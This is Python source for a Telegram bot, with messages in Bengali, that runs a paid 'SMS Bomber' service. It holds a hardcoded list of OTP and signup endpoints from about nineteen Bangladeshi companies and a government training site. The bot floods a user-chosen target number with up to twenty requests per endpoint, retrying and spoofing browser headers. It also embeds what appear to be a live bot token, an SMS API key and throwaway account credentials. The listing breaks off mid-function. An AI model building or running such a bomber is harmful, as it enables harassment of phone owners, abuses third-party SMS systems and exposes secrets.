import os
import asyncio
import logging
import aiosqlite
import aiohttp
import json
import random
import csv
import re
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ===================== কনফিগারেশন =====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8072096171:AAF0UBOlXnyQNBjczNeeFVDCaiExja1xiF0")
ADMIN_ID = int(os.getenv("ADMIN_ID", 1967494059))
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "RobiEntertainment")
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "RobiEntertainment")
SMS_API_URL = os.getenv("SMS_API_URL", "https://api.paglahost.shop/Custom_SMS/api.php")
SMS_API_KEY = os.getenv("SMS_API_KEY", "Shuvo55356")

DB_PATH = os.path.join(os.path.dirname(__file__), "bot_database.db")
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.json")
LOG_FILE = "bot.log"

# ===================== লগিং =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ===================== ডিফল্ট API লিস্ট =====================
DEFAULT_APIS = [
    {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
    {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
    {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
    {"name": "Fundesh", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "body": {"msisdn": "{phone}"}},
    {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
    {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body": {"mobile": "+88{phone}"}},
    {"name": "RabbitHoleBD", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "body": {"mobile": "+88{phone}"}},
    {"name": "Qcoom", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body": {"mobileNumber": "+88{phone}"}},
    {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body": {"mobile": "{phone}"}},
    {"name": "Easy.com.bd", "method": "POST", "url": "https://core.easy.com.bd/api/v1/registration", "body": {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be"}},
    {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
    {"name": "Addatimes", "method": "POST", "url": "https://app.addatimes.com/api/login", "body": {"phone": "{phone}", "country_code": "BD"}},
    {"name": "DeeptoPlay", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}},
    {"name": "TimezoneBD", "method": "POST", "url": "https://backend.timezonebd.com/api/v1/user/otp-request", "body": {"phone": "{phone}"}},
    {"name": "Chorki", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+880{phone}"}},
    {"name": "Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "body": {"mobile_no": "{phone}"}},
    {"name": "Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "body": {"phone": "{phone}"}},
    {"name": "BdTickets", "method": "POST", "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "body": {"phone": "+880{phone}"}},
    {"name": "Binge.buzz", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login", "body": {"mobile": "{phone}"}},
]

WORKING_APIS = []
API_LIMITS = {"daily_limit": 1000, "per_user_limit": 50, "api_call_interval": 0.8, "max_retries": 3}

# ===================== ডাটাবেস =====================
async def init_db():
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("""CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                balance INTEGER DEFAULT 10,
                total_sms INTEGER DEFAULT 0,
                total_bombing INTEGER DEFAULT 0,
                join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'active'
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_codes (
                code TEXT PRIMARY KEY,
                amount INTEGER,
                usages INTEGER,
                created_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_history (
                user_id INTEGER,
                code TEXT,
                redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id, code)
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS api_usage (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                api_name TEXT,
                user_id INTEGER,
                success INTEGER,
                usage_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS api_stats (
                api_name TEXT PRIMARY KEY,
                total_calls INTEGER DEFAULT 0,
                total_success INTEGER DEFAULT 0,
                total_failed INTEGER DEFAULT 0,
                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS user_api_stats (
                user_id INTEGER,
                api_name TEXT,
                total_calls INTEGER DEFAULT 0,
                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id, api_name)
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS admin_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                action TEXT,
                target_id INTEGER,
                details TEXT,
                log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('FREE50', 50, 100, ?)", (ADMIN_ID,))
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('WELCOME10', 10, 200, ?)", (ADMIN_ID,))
            await db.commit()
            logger.info("✅ ডাটাবেস তৈরি হয়েছে")
    except Exception as e:
        logger.error(f"ডাটাবেস error: {e}")

def load_api_list():
    global WORKING_APIS
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
                WORKING_APIS = json.load(f)
            logger.info(f"✅ {len(WORKING_APIS)} টি API লোড হয়েছে")
        except:
            WORKING_APIS = DEFAULT_APIS.copy()
    else:
        WORKING_APIS = DEFAULT_APIS.copy()
        with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump(DEFAULT_APIS, f, indent=2, ensure_ascii=False)

# ===================== হেল্পার =====================
def replace_phone(data, phone):
    if isinstance(data, dict):
        return {k: replace_phone(v, phone) for k, v in data.items()}
    elif isinstance(data, list):
        return [replace_phone(item, phone) for item in data]
    elif isinstance(data, str):
        return data.replace('{phone}', phone)
    return data

def is_valid_bd_phone(number):
    return bool(re.match(r'^01[3-9]\d{8}$', number))

def check_success(response_text, status):
    if status in [200, 201, 202, 204]:
        try:
            data = json.loads(response_text)
            if isinstance(data, dict):
                if data.get('status') in ['success', 'ok', 'true', '1']:
                    return True
                if data.get('success') in [True, 'true', 1]:
                    return True
                if data.get('message') and 'otp' in data.get('message', '').lower():
                    return True
                if 'otp' in data:
                    return True
        except:
            text_lower = response_text.lower()
            if any(w in text_lower for w in ['success', 'otp', 'sent', 'ok', 'true', 'verified', 'done']):
                return True
    return False

async def track_api_usage(api_name, user_id, success):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                """INSERT INTO api_stats (api_name, total_calls, total_success, total_failed) 
                   VALUES (?, 1, ?, ?) 
                   ON CONFLICT(api_name) DO UPDATE SET 
                   total_calls = total_calls + 1, 
                   total_success = total_success + ?, 
                   total_failed = total_failed + ?, 
                   last_used = CURRENT_TIMESTAMP""",
                (api_name, 1 if success else 0, 0 if success else 1,
                 1 if success else 0, 0 if success else 1)
            )
            await db.execute(
                """INSERT INTO user_api_stats (user_id, api_name, total_calls) 
                   VALUES (?, ?, 1) 
                   ON CONFLICT(user_id, api_name) DO UPDATE SET 
                   total_calls = total_calls + 1, 
                   last_used = CURRENT_TIMESTAMP""",
                (user_id, api_name)
            )
            await db.execute(
                "INSERT INTO api_usage (api_name, user_id, success) VALUES (?, ?, ?)",
                (api_name, user_id, 1 if success else 0)
            )
            await db.commit()
    except Exception as e:
        logger.error(f"API ট্র্যাক error: {e}")

async def admin_log(admin_id, action, target_id=None, details=""):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT INTO admin_logs (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)",
                (admin_id, action, target_id, details)
            )
            await db.commit()
    except Exception as e:
        logger.error(f"অ্যাডমিন লগ error: {e}")

# ===================== কীবোর্ড =====================
def get_main_keyboard():
    keyboard = [
        ["📨 Send SMS", "💣 SMS Bomber"],
        ["👤 My Profile", "🎁 Redeem Code"],
        ["📊 My Stats", "📞 Contact Admin"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_keyboard():
    keyboard = [
        ["💰 Add Credit", "➖ Remove Credit"],
        ["🚫 Ban User", "✅ Unban User"],
        ["📣 Broadcast", "🎟️ Create Code"],
        ["📊 Live Stats", "📈 API Stats"],
        ["👥 Users List", "🏆 Top Users"],
        ["💰 Total Balance", "📋 API List"],
        ["🔄 Reset Limits", "📤 Export Data"],
        ["🗑️ Clear Logs", "📜 Admin Logs"],
        ["🔙 Back"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_back_keyboard():
    return ReplyKeyboardMarkup([["🔙 Back"]], resize_keyboard=True)

def get_admin_choice_keyboard():
    return ReplyKeyboardMarkup([["👑 Admin Panel", "👤 User Menu"]], resize_keyboard=True)

async def is_user_banned(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT status FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            return row and row[0] == 'banned'

# ===================== স্টার্ট =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)",
            (user_id, user.username or user.first_name)
        )
        await db.commit()
    if await is_user_banned(user_id):
        await update.message.reply_text("🚫 আপনার অ্যাকাউন্ট ব্যান করা হয়েছে।")
        return
    if user_id == ADMIN_ID:
        await update.message.reply_text(
            f"👑 **স্বাগতম অ্যাডমিন {user.first_name}!**\n\nআপনি চাইলে অ্যাডমিন প্যানেল বা ইউজার মেনু ব্যবহার করতে পারেন।",
            parse_mode="Markdown",
            reply_markup=get_admin_choice_keyboard()
        )
    else:
        await update.message.reply_text(
            f"🔥 **স্বাগতম {user.first_name}!**\n\n"
            f"🆔 ID: `{user_id}`\n"
            f"💰 ব্যালেন্স: ১০ ক্রেডিট\n"
            f"📡 এপিআই: {len(WORKING_APIS)}\n\n"
            f"📌 **একটি অপশন নির্বাচন করুন:**",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

# ===================== ইউজার ফাংশনসমূহ =====================
async def cmd_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if await is_user_banned(user_id):
        await update.message.reply_text("🚫 আপনি ব্যান্ড!")
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            if not row or row[0] < 1:
                await update.message.reply_text(
                    f"❌ **পর্যাপ্ত ক্রেডিট নেই!**\n💰 ব্যালেন্স: {row[0] if row else 0}\n👨‍💻 যোগাযোগ: @{ADMIN_USERNAME}",
                    parse_mode="Markdown",
                    reply_markup=get_main_keyboard()
                )
                return
    await update.message.reply_text(
        "📨 **এসএমএস পাঠান**\n\nমোবাইল নম্বর দিন (০১XXXXXXXXX):\n💰 খরচ: ১ ক্রেডিট",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'sms_number'

async def sms_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    if not is_valid_bd_phone(number):
        await update.message.reply_text("❌ ভুল নম্বর! ফরম্যাট: ০১৮XXXXXXXX", reply_markup=get_back_keyboard())
        return
    context.user_data['sms_number'] = number
    context.user_data['state'] = 'sms_message'
    await update.message.reply_text(
        f"✅ নম্বর: `{number}`\n\n💬 **আপনার মেসেজ লিখুন:**",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def sms_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    number = context.user_data.get('sms_number')
    msg_text = update.message.text
    if not number:
        await update.message.reply_text("❌ ত্রুটি! আবার চেষ্টা করুন।", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    await update.message.reply_text(f"⏳ `{number}`-এ এসএমএস পাঠানো হচ্ছে...", parse_mode="Markdown")
    success = False
    response_text = ""
    try:
        params = {"key": SMS_API_KEY, "number": number, "msg": msg_text}
        async with aiohttp.ClientSession() as session:
            async with session.get(SMS_API_URL, params=params, timeout=30) as resp:
                response_text = await resp.text()
                success = check_success(response_text, resp.status)
    except Exception as e:
        response_text = str(e)
        logger.error(f"SMS error: {e}")
    if success:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE users SET balance = balance - 1, total_sms = total_sms + 1 WHERE user_id = ?", (user_id,))
            await db.commit()
        await update.message.reply_text(
            f"✅ **এসএমএস সফল!**\n\n📱 নম্বর: `{number}`\n💰 ১ ক্রেডিট কাটা হয়েছে",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    else:
        await update.message.reply_text(
            f"❌ **এসএমএস ব্যর্থ!**\n\n📱 নম্বর: `{number}`\n⚠️ এরর: `{response_text[:100]}`",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    context.user_data.clear()

async def cmd_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if await is_user_banned(user_id):
        await update.message.reply_text("🚫 আপনি ব্যান্ড!")
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            if not row or row[0] < 1:
                await update.message.reply_text("❌ বোম্বিং করতে কমপক্ষে ১ ক্রেডিট লাগে!", reply_markup=get_main_keyboard())
                return
    await update.message.reply_text(
        "💣 **এসএমএস বোম্বার**\n\nটার্গেট নম্বর দিন (০১XXXXXXXXX):\n📡 এপিআই: {}\n⚠️ প্রতি এপিআই সর্বোচ্চ ২০ বার".format(len(WORKING_APIS)),
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'bomber_number'

async def bomber_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    if not is_valid_bd_phone(number):
        await update.message.reply_text("❌ ভুল নম্বর! ফরম্যাট: ০১৮XXXXXXXX", reply_markup=get_back_keyboard())
        return
    context.user_data['bomber_number'] = number
    context.user_data['state'] = 'bomber_amount'
    await update.message.reply_text(
        f"✅ নম্বর: `{number}`\n\n💥 **প্রতি এপিআইতে কতবার পাঠাবেন? (১-২০)**\n📊 মোট: {len(WORKING_APIS)} × পরিমাণ",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    number = context.user_data.get('bomber_number')
    try:
        amount = int(update.message.text.strip())
        if amount < 1 or amount > 20:
            await update.message.reply_text("❌ পরিমাণ ১-২০ এর মধ্যে হতে হবে!", reply_markup=get_back_keyboard())
            return
    except ValueError:
        await update.message.reply_text("❌ সঠিক সংখ্যা দিন!", reply_markup=get_back_keyboard())
        return
    if not number:
        await update.message.reply_text("❌ ত্রুটি! আবার শুরু করুন।", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    total_sms = len(WORKING_APIS) * amount
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            if not row or row[0] < total_sms:
                await update.message.reply_text(
                    f"❌ পর্যাপ্ত ক্রেডিট নেই! প্রয়োজন: {total_sms}, আপনার আছে: {row[0] if row else 0}",
                    reply_markup=get_main_keyboard()
                )
                context.user_data.clear()
                return
        await db.execute("UPDATE users SET balance = balance - ?, total_bombing = total_bombing + 1 WHERE user_id = ?", (total_sms, user_id))
        await db.commit()
    msg = await update.message.reply_text(
        f"⏳ **বোম্বিং শুরু!**\n\n📱 টার্গেট: `{number}`\n📡 এপিআই: {len(WORKING_APIS)}\n💥 প্রতি এপিআই: {amount}\n📊 মোট: {total_sms}\n⏰ দয়া করে অপেক্ষা করুন...",
        parse_mode="Markdown"
    )
    success_count = 0
    failed_count = 0
    api_results = []
    async with aiohttp.ClientSession() as session:
        for api in WORKING_APIS:
            api_success = 0
            api_failed = 0
            for j in range(amount):
                retries = API_LIMITS.get("max_retries", 3)
                for attempt in range(retries):
                    try:
                        body = replace_phone(api['body'], number)
                        headers = {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Accept-Encoding": "gzip, deflate, br",
                            "Connection": "keep-alive"
                        }
                        await asyncio.sleep(random.uniform(0.5, 1.0))
                        if api['method'] == 'POST':
                            async with session.post(api['url'], json=body, headers=headers, timeout=15) as resp:
                                text = await resp.text()
                                if check_success(text, resp.status):
                                    api_success += 1
                                    success_count += 1
                                    break
                                else:
                                    api_failed += 1
                                    failed_count += 1
                        else:
                            async with session.get(api['url'], headers=headers, timeout=15) as resp:
                                if resp.status in [200, 201, 202, 204]:
                                    api_success += 1
                                    success_count += 1
                                    break
                                else:
                                    api_failed += 1
                                    failed_count += 1
                    except asyncio.TimeoutError:
                        if attempt == retries - 1:
                            api_failed += 1
                            failed_count += 1
                        else:
                            await asyncio.sleep(1)
                    except Exception as e:
                        logger.error(f"API error {api['name']}: {e}")
                        if attempt == retries - 1:
                            api_failed += 1
                            failed_count += 1
                        else:
                            await asyncio.sleep(1)
                done = sum([r['success'] + r['failed'] for r in api_results]) + api_success + api_failed
                if done % 10 == 0 or done == total_sms:
                    try:
                        await msg.edit_text(
                            f"⏳ **বোম্বিং চলছে...**\n\n📱 টার্গেট: `{number}`\n✅ সফল: {success_count}\n❌ ব্যর্থ: {failed_count}\n📊 অগ্রগতি: {done}/{total_sms}",
                            parse_mode="Markdown"
                        )
                    except:
                        pass
            overall_success = api_success > 0
            await track_api_usage(api['name'], user_id, overall_success)
            api_results.append({
                'name': api['name'],
                'success': api_success,
                'failed': api_failed,
                'overall': overall_success
            })
    success_rate = round((success_count / total_sms) * 100, 2) if total_sms > 0 else 0
    top_apis = sorted(api_results, key=lambda x: x['success'], reverse=True)[:10]
    top_apis_text = ""
    for idx, api in enumerate(top_apis, 1):
        if api['success'] > 0:
            top_apis_text += f"{idx}. {api['name']}: ✅{api['success']}\n"
    if not top_apis_text:
        top_apis_text = "❌ কোনো সফল এপিআই নেই!"
    result_message = (
        f"✅ **বোম্বিং সম্পূর্ণ!**\n\n"
        f"📱 টার্গেট: `{number}`\n"
        f"📡 এপিআই: {len(WORKING_APIS)}\n"
        f"💥 মোট: {total_sms}\n"
        f"✅ সফল: {success_count}\n"
        f"❌ ব্যর্থ: {failed_count}\n"
        f"📊 সাফল্য হার: {success_rate}%\n\n"
        f"🏆 **শীর্ষ ১০ এপিআই:**\n{top_apis_text}"
    )
    await msg.edit_text(result_message, parse_mode="Markdown", reply_markup=get_main_keyboard())
    context.user_data.clear()

async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if await is_user_banned(user_id):
        await update.message.reply_text("🚫 আপনি ব্যান্ড!")
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT username, balance, total_sms, total_bombing, join_date, status FROM users WHERE user_id = ?",
            (user_id,)
        ) as cur:
            row = await cur.fetchone()
    if row:
        await update.message.reply_text(
            f"👤 **আমার প্রোফাইল**\n\n🆔 ID: `{user_id}`\n👤 ইউজারনেম: {row[0] or 'N/A'}\n💰 ব্যালেন্স: {row[1]}\n📨 এসএমএস: {row[2]}\n💣 বোম্বিং: {row[3]}\n🚦 স্ট্যাটাস: {row[5].capitalize()}\n📅 জয়েন: {row[4][:10] if row[4] else 'N/A'}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if await is_user_banned(user_id):
        await update.message.reply_text("🚫 আপনি ব্যান্ড!")
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT balance, total_sms, total_bombing FROM users WHERE user_id = ?",
            (user_id,)
        ) as cur:
            row = await cur.fetchone()
    if row:
        await update.message.reply_text(
            f"📊 **আমার স্ট্যাটস**\n\n💰 ব্যালেন্স: {row[0]}\n📨 এসএমএস: {row[1]}\n💣 বোম্বিং: {row[2]}\n📡 মোট এপিআই: {len(WORKING_APIS)}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if await is_user_banned(user_id):
        await update.message.reply_text("🚫 আপনি ব্যান্ড!")
        return
    await update.message.reply_text(
        "🎟 **রিডিম কোড দিন:**\n\nউপলব্ধ: `FREE50`, `WELCOME10`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'redeem_code'

async def redeem_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.strip().upper()
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT 1 FROM redeem_history WHERE user_id = ? AND code = ?", (user_id, code)) as cur:
            if await cur.fetchone():
                await update.message.reply_text("❌ আপনি এই কোড আগেই ব্যবহার করেছেন!", reply_markup=get_main_keyboard())
                context.user_data.clear()
                return
        async with db.execute("SELECT amount, usages FROM redeem_codes WHERE code = ?", (code,)) as cur:
            row = await cur.fetchone()
            if not row or row[1] <= 0:
                await update.message.reply_text("❌ কোডটি ভুল বা মেয়াদোত্তীর্ণ!", reply_markup=get_main_keyboard())
                context.user_data.clear()
                return
            amount = row[0]
            await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
            await db.execute("UPDATE redeem_codes SET usages = usages - 1 WHERE code = ?", (code,))
            await db.execute("INSERT INTO redeem_history (user_id, code) VALUES (?, ?)", (user_id, code))
            await db.commit()
    await update.message.reply_text(
        f"🎉 **কোড রিডিম সফল!**\n✅ +{amount} ক্রেডিট!",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    context.user_data.clear()

async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📩 অ্যাডমিনকে মেসেজ", url=f"https://t.me/{ADMIN_USERNAME}")],
        [InlineKeyboardButton("📢 সাপোর্ট", url=f"https://t.me/{ADMIN_USERNAME}")]
    ]
    await update.message.reply_text(
        f"📞 **যোগাযোগ**\n\n👨‍💻 অ্যাডমিন: @{ADMIN_USERNAME}\n👨‍💻 মালিক: @{OWNER_USERNAME}",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ===================== অ্যাডমিন ফাংশনসমূহ =====================
async def admin_add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(
        "💰 **ক্রেডিট যোগ করুন**\n\nইউজার আইডি ও পরিমাণ দিন:\nউদাহরণ: `1967494059 50`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'add_credit'

async def admin_remove_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(
        "➖ **ক্রেডিট কমান**\n\nইউজার আইডি ও পরিমাণ দিন:\nউদাহরণ: `1967494059 20`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'remove_credit'

async def admin_ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text("🚫 **ব্যবহারকারী ব্যান**\n\nআইডি দিন:", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'ban_user'

async def admin_unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text("✅ **ব্যান উঠান**\n\nআইডি দিন:", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'unban_user'

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text("📣 **ব্রডকাস্ট**\n\nআপনার বার্তা লিখুন:", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'broadcast'

async def admin_create_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(
        "🎟️ **রিডিম কোড তৈরি**\n\nফরম্যাট: `CODE AMOUNT USAGES`\nউদাহরণ: `BONUS25 25 50`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'create_code'

async def admin_total_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT SUM(balance), COUNT(*) FROM users") as cur:
            total, count = await cur.fetchone()
    await update.message.reply_text(
        f"💰 **সর্বমোট ব্যালেন্স**\n\n👥 ইউজার: {count}\n💰 মোট: {total or 0}\n📊 গড়: {round((total or 0)/count if count else 0, 2)}",
        parse_mode="Markdown",
        reply_markup=get_admin_keyboard()
    )

async def admin_top_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT user_id, username, balance, total_sms, total_bombing FROM users ORDER BY balance DESC LIMIT 10"
        ) as cur:
            users = await cur.fetchall()
    if not users:
        await update.message.reply_text("কোনো ইউজার নেই!", reply_markup=get_admin_keyboard())
        return
    response = "🏆 **শীর্ষ ১০ ইউজার (ব্যালেন্স অনুযায়ী)**\n\n"
    for i, u in enumerate(users, 1):
        response += f"{i}. ID: `{u[0]}` - 💰{u[2]} (📨{u[3]} 💣{u[4]})\n"
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_export_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text("⏳ ডেটা এক্সপোর্ট হচ্ছে...")
    csv_file = f"users_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT * FROM users") as cur:
                rows = await cur.fetchall()
        with open(csv_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['ID', 'Username', 'Balance', 'Total SMS', 'Total Bombing', 'Join Date', 'Status'])
            writer.writerows(rows)
        await update.message.reply_document(
            document=open(csv_file, 'rb'),
            caption=f"📤 ইউজার ডেটা এক্সপোর্ট\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            reply_markup=get_admin_keyboard()
        )
    except Exception as e:
        await update.message.reply_text(f"❌ এক্সপোর্ট ব্যর্থ: {str(e)}", reply_markup=get_admin_keyboard())
    finally:
        if os.path.exists(csv_file):
            os.remove(csv_file)

async def admin_reset_limits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    global API_LIMITS
    API_LIMITS = {"daily_limit": 1000, "per_user_limit": 50, "api_call_interval": 0.8, "max_retries": 3}
    await update.message.reply_text("🔄 **API লিমিট রিসেট করা হয়েছে!**", parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_clear_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM admin_logs")
        await db.commit()
    await update.message.reply_text("🗑️ **লগ ক্লিয়ার করা হয়েছে!**", parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
